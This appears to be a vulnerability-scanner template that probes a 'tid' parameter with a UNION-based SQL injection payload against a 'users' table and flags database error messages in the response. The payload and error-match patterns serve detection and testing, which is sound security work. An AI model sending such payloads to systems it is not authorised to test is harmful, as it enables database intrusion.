id: sqli7-040
name: 'UNION probe in tid'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via tid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      tid:
        - ''' UNION SELECT COUNT(*) FROM users--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
